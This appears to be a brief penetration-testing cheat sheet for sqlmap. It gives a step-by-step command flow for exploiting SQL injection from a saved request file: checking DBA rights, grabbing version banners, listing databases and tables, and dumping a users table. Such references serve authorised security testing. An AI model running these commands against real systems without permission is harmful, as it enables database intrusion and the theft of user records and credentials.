
# SQLMAP

Run SQLMap (with request file)
```
sqlmap -r <request-file> --level 5 --risk 3
```

Next steps:

- Add `--dbs` to check all databases.
- Remove `--dbs` and add `-D <database_name> --tables`.
- Remove `--tables` and add `-T <table_name> --dump`

Flow: 
- sqlmap -r <request-file> --level 5 --risk 3 `continue if succeed`
- sqlmap -r <request-file> --level 5 --risk 3 --is-dba `check for True/False`
- sqlmap -r <request-file> --level 5 --risk 3 --banner `show os/database version information`
- sqlmap -r <request-file> --level 5 --risk 3 --dbs `show databases`
- sqlmap -r <request-file> --level 5 --risk 3 -D admin_database --tables `show all tables in "admin_database" database`
- sqlmap -r <request-file> --level 5 --risk 3 -D admin_database -T users --dump `dump all schema/data from users table`
